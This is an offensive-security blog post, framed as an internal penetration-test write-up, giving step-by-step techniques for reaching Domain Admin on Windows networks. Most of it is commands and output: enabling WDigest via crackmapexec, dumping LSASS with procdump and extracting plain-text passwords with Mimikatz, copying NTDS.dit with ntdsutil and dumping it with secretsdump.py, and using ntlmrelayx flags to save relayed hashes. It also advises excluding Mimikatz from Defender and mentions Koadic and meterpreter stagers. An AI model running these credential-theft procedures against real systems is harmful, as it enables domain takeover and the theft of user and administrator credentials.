<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Helpful Tricks I Use to Get Domain Admin ::
        H4cklife!! — No-life it
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
Dumping Lsass on Windows 10 😋 # Quick and Easy # So, we all know you can&amp;rsquo;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on &amp;ldquo;How I use Koadic on Internals&amp;rdquo; for that; No, on Windows 10 we have to be a little more sophisticated."
/>
<meta
  name="keywords"
  content="Hacking"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/helpful-tricks-i-use-to-get-domain-admin/" />





<link rel="stylesheet" href="/assets/style.css" />

<link rel="stylesheet" href="/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Helpful Tricks I Use to Get Domain Admin"/>
<meta name="twitter:description" content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
Dumping Lsass on Windows 10 😋 # Quick and Easy # So, we all know you can&rsquo;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on &ldquo;How I use Koadic on Internals&rdquo; for that; No, on Windows 10 we have to be a little more sophisticated."/>



<meta property="og:title" content="Helpful Tricks I Use to Get Domain Admin" />
<meta property="og:description" content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
Dumping Lsass on Windows 10 😋 # Quick and Easy # So, we all know you can&rsquo;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on &ldquo;How I use Koadic on Internals&rdquo; for that; No, on Windows 10 we have to be a little more sophisticated." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/helpful-tricks-i-use-to-get-domain-admin/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-10-07T18:22:27-05:00" />
<meta property="article:modified_time" content="2019-10-07T18:22:27-05:00" /><meta property="og:site_name" content="H4cklife!!" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >H4cklife!!</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about/">About</a></li>
        
      
        
          <li><a href="/beefhook/">Beefhooks</a></li>
        
      
        
          <li><a href="/coalcast/">Coalcast!</a></li>
        
      
        
          <li><a href="/wallpapers/">Wallpapers</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about/">About</a></li>
      
    
      
        <li><a href="/beefhook/">Beefhooks</a></li>
      
    
      
        <li><a href="/coalcast/">Coalcast!</a></li>
      
    
      
        <li><a href="/wallpapers/">Wallpapers</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Helpful Tricks I Use to Get Domain Admin</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2019-10-07
        </span>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 10 min read</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <p>So I was recently on an internal assessment (Thanks <a href="https://twitter.com/hexcartel">Hexcartel</a>) and got to do some cool tricks I felt like sharing. Behold some tricks:</p>
<h3 id="dumping-lsass-on-windows-10-">
  Dumping Lsass on Windows 10 😋
  <a href="#dumping-lsass-on-windows-10-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<h3 id="quick-and-easy">
  Quick and Easy
  <a href="#quick-and-easy" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>So, we all know you can&rsquo;t just blast <a href="">Crackmapexec</a> and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on <a href="../how-i-use-koadic-on-internals">&ldquo;How I use Koadic on Internals&rdquo;</a> for that; No, on Windows 10 we have to be a little more sophisticated. So, let&rsquo;s say you&rsquo;ve gotten local admin creds to a system and there&rsquo;s another Domain Admin that uses the same system but you can&rsquo;t seem to find a way to get their creds. Well, since you have local admin to that box you can use <code>Crackmapexec</code> to enable wdigest on that system so that next time the user auths&rsquo; to that system their creds will get stored in memory and you&rsquo;ll be able to dump them.</p>
<p>In dumping their creds you actually have a few ways of doing it. If you want to do this easily you can simply RDP into the host after hours, open up task-manager, right mouse-click on lsass.exe on the <code>details</code> tab, and select <code>create dump file</code>. That&rsquo;ll create a dump file of the lsass.exe process which you can then use Mimikatz against the dump file on your local attacking machine to get some plain-text creds; done.</p>
<h4 id="procdump">
  Procdump
  <a href="#procdump" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>The other way is to use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> [Thanks <a href="http://www.n00py.io/">N00py</a>] to create the dump file. This is a great tool that will go undetected being that it is a Microsoft SysInternals tool. Every time I do this process I use this <a href="https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php">ARTICLE</a> which walks through the process of dumping lsass with Procdump and dumping the creds locally with Mimikatz. It&rsquo;s basically a <b>TLDR</b> of this tip. Using procdump instead of RDPing will allow for more creativity in creating the dump file you need as you can now use the command line in this process.</p>
<h4 id="getting-the-dump-back-">
  Getting The Dump Back 👈
  <a href="#getting-the-dump-back-" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>So a great way to get the file back off the Windows 10 system is to use <code>smbclient</code>. I often completely forget about smbclient when working on internals. I guess it gets overshadowed by the sexiness of Crackmapexec but it&rsquo;s good for downloading files really quickly. Another way is to use SCP since Windows 10 now comes with SSH tools. Usually with these two methods you should be good on getting the file back to your attacking machine. If those won&rsquo;t work Bitsadmin? Powershell&hellip;time to Google&hellip;</p>
<p>Once you get the file locally you&rsquo;ll wanna get it to a local Windows system that has Mimikatz on it <i>(Comment below if you can do this on Linux)</i>. Once you have everything ready follow the steps <a href="https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php">here</a> or below.</p>
<p>So here&rsquo;s the TLDR steps to do all this:</p>
<h4 id="steps-">
  Steps 👟
  <a href="#steps-" class="h-anchor" aria-hidden="true">#</a>
</h4>
<ol>
<li>Enable Wdigest:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb TARGETHOST -M wdigest -o ACTION<span style="color:#f92672">=</span>enable
</span></span></code></pre></div><ol start="2">
<li>Wait a while for the target user to auth to their system</li>
<li>Use smbclient or Crackmapexec or whatever to upload <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> and dump lsass with it:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\A</span>NOTHER-USER<span style="color:#ae81ff">\d</span>esktop<span style="color:#ae81ff">\p</span>rocdump.exe -accepteula -ma lsass.exe lsass.dmp
</span></span></code></pre></div><p><b> OR&hellip;</b>
4. After hours, RDP in to the target system ➡ Open Task-manager and go to Details tab ➡ Right mouse-click and dump lsass.exe</p>
<ol start="5">
<li>Download the dump file to your attacking machine</li>
<li>Use Mimikatz locally and dump the file using the following commands:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz $ sekurlsa::minidump YOUR_DUMP_FILE.dmp
</span></span><span style="display:flex;"><span>Switch to minidump
</span></span><span style="display:flex;"><span>mimikatz $ sekurlsa::logonPasswords
</span></span></code></pre></div><ol start="7">
<li><u>LOOK CLOSELY</u> to the output. <b>IF YOU DO NOT LOOK CLOSELY YOU COULD MISS A DOMAIN ADMIN CRED!!!</b> A good tip to make sure you&rsquo;re not missing anything is to copy everything to your local Linux system and use <code>grep</code> to grep for passwords. I usually do:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat mimikatz_output.txt | grep -i password -B2
</span></span></code></pre></div><p>This will show both the usernames and passwords that were dumped. If the user logged in during the time between you enabling wdigest and dumping lsass you should have the target user&rsquo;s creds in plain-text!</p>
<h4 id="notes-">
  Notes 📝
  <a href="#notes-" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>One thing to note about having Mimikatz on Windows 10: You&rsquo;ll need to white-list a folder in your defender settings so it doesn&rsquo;t keep getting popped by your own AV. I&rsquo;m also sure there&rsquo;s someone out there that would read all this and say&hellip;&ldquo;Why don&rsquo;t you just use/do XYZ to do all this instantly?&rdquo; To you I say, &ldquo;leave a comment below! Grace us with your knowledge and wisdom!&rdquo;</p>
<center>
<figure>
<img src="../../images/Wallpapers/nice_view.jpg" alt="Wallpaper" />
<figcaption>
<center>You Found A Wallpaper!</center>
</figcaption>
</figure>
</center>
<h3 id="dumping-ntds-manually-with-a-native-windows-tool">
  Dumping NTDS Manually With A Native Windows Tool
  <a href="#dumping-ntds-manually-with-a-native-windows-tool" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Sometimes, due to anti-virus or restrictions against tools, you are unable to use Crackmapexec to dump the DC when that time comes. Sometimes you may have to dump it manually and a great way to do this is by using another native Windows tool by the name of <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753343(v=ws.10)?redirectedfrom=MSDN">NTDSUTIL</a>. If you have the time you can read this <a href="https://www.cyberis.co.uk/2014/02/obtaining-ntdsdit-using-in-built.html">ARTICLE</a> on this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>Posh<span style="color:#f92672">&gt;</span> ntds
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span>ntds<span style="color:#960050;background-color:#1e0010">&#39;</span> is not recognized as an internal or external command,
</span></span><span style="display:flex;"><span>operable program or batch file.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>Posh<span style="color:#f92672">&gt;</span> ntdsutil
</span></span><span style="display:flex;"><span>ntdsutil: activate instance ntds
</span></span><span style="display:flex;"><span>Active instance set to <span style="color:#e6db74">&#34;ntds&#34;</span>.
</span></span><span style="display:flex;"><span>ntdsutil: ifm
</span></span><span style="display:flex;"><span>ifm: c:<span style="color:#960050;background-color:#1e0010">\</span>dumpty
</span></span><span style="display:flex;"><span>ifm: create full c:<span style="color:#960050;background-color:#1e0010">\</span>dumpty
</span></span><span style="display:flex;"><span>Creating snapshot...
</span></span><span style="display:flex;"><span>Snapshot set {<span style="color:#ae81ff">159231</span>da<span style="color:#f92672">-</span>b786<span style="color:#f92672">-</span><span style="color:#ae81ff">465</span>e<span style="color:#f92672">-</span>a70f<span style="color:#f92672">-</span>aacd369d8487} generated successfully.
</span></span><span style="display:flex;"><span>Snapshot {<span style="color:#ae81ff">179</span>aaee5<span style="color:#f92672">-</span>ddaf<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>be6<span style="color:#f92672">-</span>b77e<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>bd64771de86} mounted as C:<span style="color:#960050;background-color:#1e0010">\$</span>SNAP_201910081913
</span></span><span style="display:flex;"><span>_VOLUMEC<span style="color:#960050;background-color:#1e0010">$</span>\
</span></span><span style="display:flex;"><span>Snapshot {<span style="color:#ae81ff">179</span>aaee5<span style="color:#f92672">-</span>ddaf<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>be6<span style="color:#f92672">-</span>b77e<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>bd64771de86} is already mounted.
</span></span><span style="display:flex;"><span>Initiating DEFRAGMENTATION mode...
</span></span><span style="display:flex;"><span>     Source Database: C:<span style="color:#960050;background-color:#1e0010">\$</span>SNAP_201910081913_VOLUMEC<span style="color:#960050;background-color:#1e0010">$\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>NTDS<span style="color:#960050;background-color:#1e0010">\</span>ntds.dit
</span></span><span style="display:flex;"><span>     Target Database: c:<span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>Active Directory<span style="color:#960050;background-color:#1e0010">\</span>ntds.dit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                  Defragmentation  Status (<span style="color:#f92672">%</span> complete)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">10</span>   <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">30</span>   <span style="color:#ae81ff">40</span>   <span style="color:#ae81ff">50</span>   <span style="color:#ae81ff">60</span>   <span style="color:#ae81ff">70</span>   <span style="color:#ae81ff">80</span>   <span style="color:#ae81ff">90</span>  <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">|----|----|----|----|----|----|----|----|----|----|</span>
</span></span><span style="display:flex;"><span>          ...................................................
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Copying registry files...
</span></span><span style="display:flex;"><span>Copying c:<span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM
</span></span><span style="display:flex;"><span>Copying c:<span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span>SECURITY
</span></span><span style="display:flex;"><span>Snapshot {<span style="color:#ae81ff">179</span>aaee5<span style="color:#f92672">-</span>ddaf<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>be6<span style="color:#f92672">-</span>b77e<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>bd64771de86} unmounted.
</span></span><span style="display:flex;"><span>IFM media created successfully in c:<span style="color:#960050;background-color:#1e0010">\</span>dumpty
</span></span><span style="display:flex;"><span>ifm: quit
</span></span><span style="display:flex;"><span>ntdsutil: quit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Download the NTDS.dit with SMBCLIENT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>smb: <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>Active Directory<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&gt;</span> get ntds.dit
</span></span><span style="display:flex;"><span>getting file <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>Active Directory<span style="color:#960050;background-color:#1e0010">\</span>ntds.dit of size <span style="color:#ae81ff">119554048</span> as ntds.dit (<span style="color:#ae81ff">85282.7</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">85282.7</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>smb: <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&gt;</span> get SECURITY
</span></span><span style="display:flex;"><span>getting file <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span>SECURITY of size <span style="color:#ae81ff">262144</span> as SECURITY (<span style="color:#ae81ff">25599.8</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">25600.0</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>smb: <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&gt;</span> get SYSTEM
</span></span><span style="display:flex;"><span>getting file <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM of size <span style="color:#ae81ff">9961472</span> as SYSTEM (<span style="color:#ae81ff">54044.4</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">52547.4</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>smb: <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>Active Directory<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&gt;</span> exit
</span></span></code></pre></div><p>Next you&rsquo;ll use all three of these files when using <a href="https://github.com/SecureAuthCorp/impacket">secretsdump.py</a> to dump the domain&rsquo;s AD credentials locally on your attacking machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">⋊</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">~/</span>C<span style="color:#f92672">/</span>CREDS python <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>doc<span style="color:#f92672">/</span>python<span style="color:#f92672">-</span>impacket<span style="color:#f92672">/</span>examples<span style="color:#f92672">/</span>secretsdump.py <span style="color:#f92672">-</span>ntds ntds.dit <span style="color:#f92672">-</span>system SYSTEM <span style="color:#f92672">-</span>security SECURITY LOCAL
</span></span><span style="display:flex;"><span>Impacket v0<span style="color:#ae81ff">.9.19</span> <span style="color:#f92672">-</span> Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Target system bootKey: <span style="color:#ae81ff">0x7u</span><span style="color:#ae81ff">77e239</span>a4dc745d0a21270c271a4509
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Dumping cached domain logon information (domain<span style="color:#f92672">/</span>username:hash)
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Dumping LSA Secrets
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#960050;background-color:#1e0010">$</span>MACHINE.ACC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...SNIP...
</span></span></code></pre></div><h4 id="notes--1">
  Notes 📝
  <a href="#notes--1" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>Dumping this way locally may take a long time depending on what kind of setup you have. It won&rsquo;t be lightning fast like crackmapexec is so don&rsquo;t be shocked by this behavior.</p>
<center>
<figure>
<img src="../../images/Wallpapers/mountains.jpeg" alt="Wallpaper" />
<figcaption>
<center>You Found Another Wallpaper!</center>
</figcaption>
</figure>
</center>
<h3 id="saving-the-hashes-you-relay-">
  Saving the Hashes you Relay 💼
  <a href="#saving-the-hashes-you-relay-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Yea, it never dawned on me to look at the flags of NTLMrelayX until I looked at the flags of NTLMrelayX. Apprently there&rsquo;s a ton of good features that it can do besides absentmindedly relaying NTLMv2s at targets.</p>
<h4 id="ntlmrelayx-flags">
  NtlmrelayX Flags
  <a href="#ntlmrelayx-flags" class="h-anchor" aria-hidden="true">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>⋊&gt; /e/g/i/i/e/ntlmrelayx on master ◦ /usr/local/bin/ntlmrelayx.py -h                                    22:52:27
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...snip...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Main options:
</span></span><span style="display:flex;"><span>  -h, --help            show this help message and exit
</span></span><span style="display:flex;"><span>  -debug                Turn DEBUG output ON
</span></span><span style="display:flex;"><span>  -t TARGET, --target TARGET
</span></span><span style="display:flex;"><span>                        Target to relay the credentials to, can be an IP,
</span></span><span style="display:flex;"><span>                        hostname or URL like smb://server:445 If unspecified,
</span></span><span style="display:flex;"><span>                        it will relay back to the client
</span></span><span style="display:flex;"><span>  -tf TARGETSFILE       File that contains targets by hostname or full URL,
</span></span><span style="display:flex;"><span>                        one per line
</span></span><span style="display:flex;"><span>  -w                    Watch the target file <span style="color:#66d9ef">for</span> changes and update target
</span></span><span style="display:flex;"><span>                        list automatically <span style="color:#f92672">(</span>only valid with -tf<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  -i, --interactive     Launch an smbclient console instead of executing a
</span></span><span style="display:flex;"><span>                        command after a successful relay. This console will
</span></span><span style="display:flex;"><span>                        listen locally on a tcp port and can be reached with
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">for</span> example netcat.
</span></span><span style="display:flex;"><span>  -ip INTERFACE_IP, --interface-ip INTERFACE_IP
</span></span><span style="display:flex;"><span>                        IP address of interface to bind SMB and HTTP servers
</span></span><span style="display:flex;"><span>  --no-smb-server       Disables the SMB server
</span></span><span style="display:flex;"><span>  --no-http-server      Disables the HTTP server
</span></span><span style="display:flex;"><span>  --smb-port SMB_PORT   Port to listen on smb server
</span></span><span style="display:flex;"><span>  --http-port HTTP_PORT
</span></span><span style="display:flex;"><span>                        Port to listen on http server
</span></span><span style="display:flex;"><span>  -ra, --random         Randomize target selection <span style="color:#f92672">(</span>HTTP server only<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  -r SMBSERVER          Redirect HTTP requests to a file:// path on SMBSERVER
</span></span><span style="display:flex;"><span>  -l LOOTDIR, --lootdir LOOTDIR
</span></span><span style="display:flex;"><span>                        Loot directory in which gathered loot such as SAM
</span></span><span style="display:flex;"><span>                        dumps will be stored <span style="color:#f92672">(</span>default: current directory<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  -of OUTPUT_FILE, --output-file OUTPUT_FILE
</span></span><span style="display:flex;"><span>                        base output filename <span style="color:#66d9ef">for</span> encrypted hashes. Suffixes
</span></span><span style="display:flex;"><span>                        will be added <span style="color:#66d9ef">for</span> ntlm and ntlmv2
</span></span><span style="display:flex;"><span>  -codec CODEC          Sets encoding used <span style="color:#f92672">(</span>codec<span style="color:#f92672">)</span> from the target<span style="color:#960050;background-color:#1e0010">&#39;</span>s output
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">(</span>default <span style="color:#e6db74">&#34;ascii&#34;</span><span style="color:#f92672">)</span>. If errors are detected, run
</span></span><span style="display:flex;"><span>                        chcp.com at the target, map the result with
</span></span><span style="display:flex;"><span>                        https://docs.python.org/2.4/lib/standard-
</span></span><span style="display:flex;"><span>                        encodings.html and <span style="color:#66d9ef">then</span> execute ntlmrelayx.py again
</span></span><span style="display:flex;"><span>                        with -codec and the corresponding codec
</span></span><span style="display:flex;"><span>  -smb2support          SMB2 Support <span style="color:#f92672">(</span>experimental!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  -socks                Launch a SOCKS proxy <span style="color:#66d9ef">for</span> the connection relayed
</span></span><span style="display:flex;"><span>  -wh WPAD_HOST, --wpad-host WPAD_HOST
</span></span><span style="display:flex;"><span>                        Enable serving a WPAD file <span style="color:#66d9ef">for</span> Proxy Authentication
</span></span><span style="display:flex;"><span>                        attack, setting the proxy host to the one supplied.
</span></span><span style="display:flex;"><span>  -wa WPAD_AUTH_NUM, --wpad-auth-num WPAD_AUTH_NUM
</span></span><span style="display:flex;"><span>                        Prompt <span style="color:#66d9ef">for</span> authentication N times <span style="color:#66d9ef">for</span> clients without
</span></span><span style="display:flex;"><span>                        MS16-077 installed before serving a WPAD file.
</span></span><span style="display:flex;"><span>  -6, --ipv6            Listen on both IPv6 and IPv4
</span></span><span style="display:flex;"><span>  --remove-mic          Remove MIC <span style="color:#f92672">(</span>exploit CVE-2019-1040<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  --serve-image SERVE_IMAGE
</span></span><span style="display:flex;"><span>                        local path of the image that will we returned to
</span></span><span style="display:flex;"><span>                        clients
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SMB client options:
</span></span><span style="display:flex;"><span>  -e FILE               File to execute on the target system. If not
</span></span><span style="display:flex;"><span>                        specified, hashes will be dumped <span style="color:#f92672">(</span>secretsdump.py must
</span></span><span style="display:flex;"><span>                        be in the same directory<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  -c COMMAND            Command to execute on target system. If not specified,
</span></span><span style="display:flex;"><span>                        hashes will be dumped <span style="color:#f92672">(</span>secretsdump.py must be in the
</span></span><span style="display:flex;"><span>                        same directory<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  --enum-local-admins   If relayed user is not admin, attempt SAMR lookup to
</span></span><span style="display:flex;"><span>                        see who is <span style="color:#f92672">(</span>only works pre Win <span style="color:#ae81ff">10</span> Anniversary<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...snip...
</span></span></code></pre></div><p>Yea so, looking at the flags, you can use <code>-of</code> to specify an output file location where NTLMrelayX will save your relayed hashes! That way if you have issues relaying commands or your target has some sort of antivirus blocking your attempts you still have a chance to crack the hashes later.</p>
<p>Another interesting flag is the <code>&ndash;enum-local-admins</code> flag. NTLMrelayX will do enumeration to try to figure out who the local admin is if the hashes you capture are low privileged! Sometimes it will fail and sometimes it won&rsquo;t but it&rsquo;s better to have than not, that&rsquo;s for sure!</p>
<p>The last flag I noticed recently was the <code>-i</code> flag which will open up an smbclient session upon successful relay. I haven&rsquo;t played with this yet but it sounds useful. Sometimes when <code>-c</code> commands aren&rsquo;t working this would be a useful alternative to start uploading or downloading some files. Sometimes admins leave big juicy password.xlsx files on their desktops that contain DA creds. This flag would be great!</p>
<h3 id="using-koadic-and-bloodhound-on-windows-servers-">
  Using Koadic and Bloodhound on Windows Servers 💣
  <a href="#using-koadic-and-bloodhound-on-windows-servers-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>More often than not if you get access to a Windows Server 2008-2012 box they usually lack strong Anti-virus provisions in place. They don&rsquo;t come with Windows Defender like a normal Windows 10 box would or anything like that so most of the time you can use a mshta stager in Koadic to quickly dump memory with the Mimikatz module or use the enum_domain_info module to quickly develop a strong foundation of information.</p>
<p>Similarly, these servers may be a good place to set up shop for a while and start doing some further enumeration. These servers will similarly be more accepting of things like BloodHound ingestors and maybe, dare I say, meterpreter payloads. You could also use these for <a href="https://github.com/NetSPI/PowerUpSQL">PowerupSQL</a> sessions if you&rsquo;re hunting for sensitive information such as card holder data or patient health information.</p>
<h3 id="smbclient-for-file-transfers-">
  SMBCLIENT For File Transfers 💽
  <a href="#smbclient-for-file-transfers-" class="h-anchor" aria-hidden="true">#</a>
</h3>
